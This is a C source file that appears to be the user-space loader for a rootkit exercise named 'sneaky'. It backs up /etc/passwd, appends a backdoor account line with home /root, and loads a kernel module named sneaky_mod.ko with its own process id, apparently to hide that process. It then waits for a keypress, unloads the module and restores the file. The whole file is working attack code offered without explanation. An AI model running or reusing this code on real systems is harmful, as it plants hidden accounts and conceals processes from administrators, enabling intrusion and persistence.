#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <termios.h>

// void readInput() {
//   struct termios old_tio, new_tio;
//   tcgetattr(STDIN_FILENO, &old_tio);
//   new_tio = old_tio;
//   new_tio.c_lflag &=(~ICANON & ~ECHO);
//   tcsetattr(STDIN_FILENO, TCSANOW, &new_tio);

//   unsigned char c;
//   do {
//     c = getchar();
//   } while(c != 'q');

//   tcsetattr(STDIN_FILENO, TCSANOW, &old_tio);
// }

int main(){
  printf("sneaky_process pid = %d\n", getpid());

  system("cp /etc/passwd /tmp");
  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> /etc/passwd");

  char cmd[100];
  sprintf(cmd, "insmod sneaky_mod.ko pid=%d pid_1=%d", getpid(), getpid()-1);
  system(cmd);

  // char c;
  // while((c = getchar())!='q'){
  // }

  struct termios old_tio, new_tio;
  tcgetattr(STDIN_FILENO, &old_tio);
  new_tio = old_tio;
  new_tio.c_lflag &=(~ICANON & ~ECHO);
  tcsetattr(STDIN_FILENO, TCSANOW, &new_tio);

  unsigned char c;
  do {
    c = getchar();
  } while(c != 'q');

  tcsetattr(STDIN_FILENO, TCSANOW, &old_tio);

  system("rmmod sneaky_mod");

  system("cp /tmp/passwd /etc");
  return EXIT_SUCCESS;
}